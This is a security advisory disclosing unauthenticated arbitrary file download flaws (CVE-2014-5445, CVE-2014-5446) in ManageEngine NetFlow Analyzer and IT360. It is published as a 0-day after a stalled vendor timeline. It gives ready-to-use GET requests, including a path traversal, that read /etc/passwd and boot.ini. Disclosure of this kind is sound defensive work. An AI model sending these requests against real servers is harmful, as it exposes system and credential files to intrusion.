>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
==========================================================================
Disclosure: 30/11/2014 / Last updated: 3/12/2014

>> Background on the affected product:
"NetFlow Analyzer, a complete traffic analytics tool, leverages flow technologies to provide real time visibility into the network bandwidth performance. NetFlow Analyzer, primarily a bandwidth monitoring tool, has been optimizing thousands of networks across the World by giving holistic view about their network bandwidth and traffic patterns. NetFlow Analyzer is a unified solution that collects, analyzes and reports about what your network bandwidth is being used for and by whom."

"Managing mission critical business applications is now made easy through ManageEngine IT360. With agentless monitoring methodology, monitor your applications, servers and databases with ease. Agentless monitoring of your business applications enables you high ROI and low TOC. With integrated network monitoring and bandwidth utilization, quickly troubleshoot any performance related issue with your network and assign issues automatically with ITIL based ServiceDesk integration."

This is being released as a 0-day because ManageEngine have been twiddling their thumbs (and making a fool out of me) for 105 days. See timeline below for explanation.


>> Technical details:
Vulnerability: Arbitrary file download
Constraints: unauthenticated in NetFlow; authenticated in IT360
Affected versions: NetFlow v8.6 to v10.2; at least IT360 v10.3 and above

CVE-2014-5445:
GET /netflow/servlet/CSVServlet?schFilePath=/etc/passwd
GET /netflow/servlet/CReportPDFServlet?schFilePath=C:\\boot.ini&pdf=true

CVE-2014-5446
GET /netflow/servlet/DisplayChartPDF?filename=../../../../boot.ini

All 3 servlets can be exploited in both Windows and Linux. A Metasploit module that exploits CVE-2014-5445 has been released.
